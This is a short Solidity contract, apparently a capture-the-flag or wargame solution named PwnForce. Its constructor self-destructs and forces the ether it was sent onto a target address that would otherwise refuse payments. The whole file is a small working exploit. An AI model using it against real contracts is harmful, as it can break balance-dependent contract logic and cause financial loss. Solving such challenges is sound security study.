// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnForce {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}
